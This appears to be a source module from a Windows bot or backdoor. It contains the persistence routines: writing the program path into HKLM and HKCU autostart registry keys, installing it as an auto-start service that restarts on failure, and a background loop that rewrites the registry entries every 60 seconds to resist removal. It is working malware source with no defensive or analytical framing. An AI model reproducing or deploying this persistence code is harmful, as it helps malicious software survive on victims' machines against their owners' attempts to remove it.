#include "includes.h"
#include "functions.h"
#include "externs.h"

// globals
#ifndef NO_REGISTRY
int registry_delay=60000;
#endif

AUTOSTART autostart[]={
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey1},
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey2},
	{HKEY_CURRENT_USER,(LPCTSTR)regkey1}
};

void AutoStartRegs(char *nfilename)
{
	HKEY key;

	for (int i=0; i < (sizeof(autostart) / sizeof(AUTOSTART)); i++) {
		fRegCreateKeyEx(autostart[i].hkey, autostart[i].subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		if (nfilename)
			fRegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)nfilename, strlen(nfilename));
		else
			fRegDeleteValue(key, valuename); 
		fRegCloseKey(key); 
	}
   
	return;
}
// EXPERIMENTAL
bool ServiceAdd(char *sServicename, char *nfilename) {
	return ServiceAddInt(sServicename, nfilename, NULL); 
}

bool ServiceAddInt(char *sServicename, char *sFilename, char *sParams) {
	SC_HANDLE hServiceControl=OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if(!hServiceControl) return false;

	char sSvcCmd[400]; sprintf(sSvcCmd, "\"%s\" %s", sFilename, sParams);
	SC_HANDLE hService=CreateService(hServiceControl, sServicename,
		valuename, SERVICE_ALL_ACCESS, \
		SERVICE_WIN32_SHARE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, \
		sSvcCmd, NULL, NULL, NULL, NULL, NULL);
	if(!hService) {
		DWORD dwError=GetLastError();
		if(dwError==ERROR_SERVICE_EXISTS) {
			ServiceDel(sServicename); CloseServiceHandle(hService);
			CloseServiceHandle(hServiceControl);
			return ServiceAdd(sServicename, sFilename);
		} else {
			CloseServiceHandle(hServiceControl); return false; }
	}

	SC_ACTION scActions[1]; scActions[0].Delay=1; scActions[0].Type=SC_ACTION_RESTART;
	SERVICE_FAILURE_ACTIONS sfActions; sfActions.dwResetPeriod=INFINITE; sfActions.lpRebootMsg=NULL;
	sfActions.lpCommand=NULL; sfActions.cActions=1; sfActions.lpsaActions=scActions;

	if(!ChangeServiceConfig2(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfActions)) {
		CloseServiceHandle(hService); CloseServiceHandle(hServiceControl); return false;
	}

	CloseServiceHandle(hService); CloseServiceHandle(hServiceControl); return true;
}
bool ServiceStart(char *sServicename) {
	SC_HANDLE hServiceControl=OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if(!hServiceControl) return false;

	SC_HANDLE hService=OpenService(hServiceControl, sServicename, SERVICE_ALL_ACCESS);
	if(!hService) { CloseServiceHandle(hServiceControl); return false; }
	StartService(hService, 0, NULL);
	CloseServiceHandle(hService); CloseServiceHandle(hServiceControl); 

/*	CString sCmdBuf; sCmdBuf.Format("net start %s", sServicename.CStr());
	system(sCmdBuf.CStr());*/

	return true;
}

bool ServiceDel(char *sServicename) {
	SC_HANDLE hServiceControl=OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if(!hServiceControl) return false;

	SC_HANDLE hService=OpenService(hServiceControl, sServicename, SERVICE_ALL_ACCESS);
	if(!hService) { CloseServiceHandle(hServiceControl); return false; }
	SERVICE_STATUS sStatus; DeleteService(hService);
	DeleteService(hService);
	ControlService(hService, SERVICE_CONTROL_STOP, &sStatus);
	DeleteService(hService);
	ControlService(hService, SERVICE_CONTROL_STOP, &sStatus);
	CloseServiceHandle(hService); CloseServiceHandle(hServiceControl);
	return true;
}

#ifndef NO_REGISTRY
DWORD WINAPI AutoRegistry(LPVOID param)
{
	char *nfilename = (char *)param;

	while (1) {
		AutoStartRegs(nfilename);
		Sleep(registry_delay);
	}
	return 0;
}
#endif
